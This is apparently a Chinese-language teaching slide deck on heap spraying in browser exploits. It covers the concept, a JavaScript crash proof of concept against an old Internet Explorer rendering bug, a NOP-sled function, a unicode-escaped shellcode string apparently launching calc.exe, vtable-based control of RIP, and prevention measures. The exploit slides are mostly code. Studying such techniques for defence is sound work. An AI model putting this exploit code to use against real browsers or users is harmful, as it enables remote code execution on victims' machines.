title: Heap Spray and its application on browser exploits
speaker: 杜小东
transition: slide3
files: https://o71zxeens.qnssl.com/cdn/ppt/jl/full-screen.js
theme: moon
usemathjax: yes

[slide]
<button onclick="fullScreen()" class="btn btn-default" style="cursor: pointer;position:fixed;left:10px;top:10px;"></button>
# Heap Spray and its application on browser exploits

[slide]
## 什么是 Heap Spray
* 使用大量 NOP，申请大量的内存，超过系统内存的特定值，即可实现在目标进程的内存中预定的位置写入一串命令

[slide]
## 有什么危害
* 执行恶意代码 {:&.rollIn}
* 恶意执行程序

[slide]
## 产生方式(Browser)
----
* large strings
* loading image files into the process
* use the low-level bitmap interface offered by the canvas API, and web workers
* [Array](https://cansecwest.com/slides/2014/The%20Art%20of%20Leaks%20-%20read%20version%20-%20Yoyo.pdf)
* [wiki](https://en.wikipedia.org/wiki/Heap_spraying)

[slide]
## 怎么攻击
----
* Crash PoC {:&.rollIn}
* NOP
* Shellcode

[slide]
## PoC(Proof of Concept)
---
```html
<body>
  <form><table><th><ins>aaaaaaaaaa aaaaaaaaaa</ins></th></table></form>
  <form><table><th><ins>aaaaaaaaaa aaaaaaaaaa</ins></th></table></form>
  <form><table><th><ins>aaaaaaaaaa aaaaaaaaaa</ins></th></table></form>
  <form><table><th><ins>aaaaaaaaaa aaaaaaaaaa</ins></th></table></form>
  <form><table><th><ins>aaaaaaaaaa aaaaaaaaaa</ins></th></table></form>
  <form><table><th><ins>aaaaaaaaaa aaaaaaaaaa</ins></th></table></form>
</body>
```
```javascript
function crash(i) {
  numsploits = numsploits + 1
  t = document.getElementsByTagName("table")[i]
  t.parentNode.runtimeStyle.posWidth = -1
  t.focus()
}
```

[slide]
## NOP
----
```javascript
function nop() {
  var nops = ''
  var nops_size = 216
  for(var i = 0; i < nops_size; i++) { 
    nops += 'A' 
  }
  return nops
}
```

[slide]
## Shellcode
* Shellcode 是指能完成特殊任务的自包含的二进制代码

----
```
var shellcode = unescape("%uc92b%u1fb1%u0cbd%uc536%udb9b%ud9c5%u2474%u5af4%uea83%u31fc%u0b6a%u6a03%ud407%u6730%u5cff%u98bb%ud7ff%ua4fe%u9b74%uad05%u8b8b%u028d%ud893%ubccd%u35a2%u37b8%u4290%ua63a%u94e9%u9aa4%ud58d%ue5a3%u1f4c%ueb46%u4b8c%ud0ad%ua844%u524a%u3b81%ub80d%ud748%u4bd4%u6c46%u1392%u734a%u204f%uf86e%udc8e%ua207%u26b4%u04d4%ud084%uecba%u9782%u217c%ue8c0%uca8c%uf4a6%u4721%u0d2e%ua0b0%ucd2c%u00a8%ub05b%u43f4%u24e8%u7a9c%ubb85%u7dcb%ua07d%ued92%u09e1%u9631%u5580")
```

[slide]
## 怎么攻击
----
* Crash PoC
* NOP
* Shellcode
* 为什么需要 NOP ?(需要精确命中 Shellcode)

[slide]
## 任意内存地址读取
----
* 通过找到 Array 后面的一个紧邻的 String 对象的内存，然后覆盖这个对象的缓冲区指针域和大小域来实现读取任意内存

[slide]
## 控制 RIP(指令指针)
----
* 通过覆盖附近 Array 对象的虚函数表(vtable)指针并调用虚函数来控制 RIP，例如计算器指令
* [vtable](https://github.com/jayzeng/The-Art-Of-Programming-by-July/blob/master/ebook/zh/08.0.md)

[slide]
## 总结与预防
----
* 浏览器上的 Heap Spray 需要利用一个浏览器漏洞，然后非正常地制造堆溢出的代码来覆盖目标进程的内存
* 对包含大量重复值的字符串和数组等重复申请堆的时候，可以记录堆的大小、内容和数量，如果这些重复的堆请求到达了一个阀值或者覆盖了指定的地址（譬如几个敏感地址0x0C0C0C0C，0x0D0D0D0D等等），立即阻止这个脚本执行过程并弹出警告
* 对常见的 JavaScript 对象的虚函数表进行保护
* 使用现代浏览器(用户)

[slide]
## 疑问
* Shellcode 是怎么转化为 系统命令(调用 calc.exe)?
* Shellcode 怎么编写?

[slide]
## 参考链接
----
* [wiki](https://en.wikipedia.org/wiki/Heap_spraying)
* [NOP](https://zh.wikipedia.org/wiki/NOP)
* [Exploiting Internet Explorer 11 64-bit on Windows 8.1 Preview](http://ifsec.blogspot.com/2013/11/exploiting-internet-explorer-11-64-bit.html)
* [calc.exe shellcode](https://github.com/peterferrie/win-exec-calc-shellcode)

* http://drinkey.github.io/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/2014/03/24/hello-shellcode/

* http://www.360doc.com/content/10/1102/19/2648643_66047788.shtml
* http://blog.csdn.net/magictong/article/details/7391397
* http://stackoverflow.com/questions/381171/help-me-understand-this-javascript-exploit
* https://github.com/exp-sky
* https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/

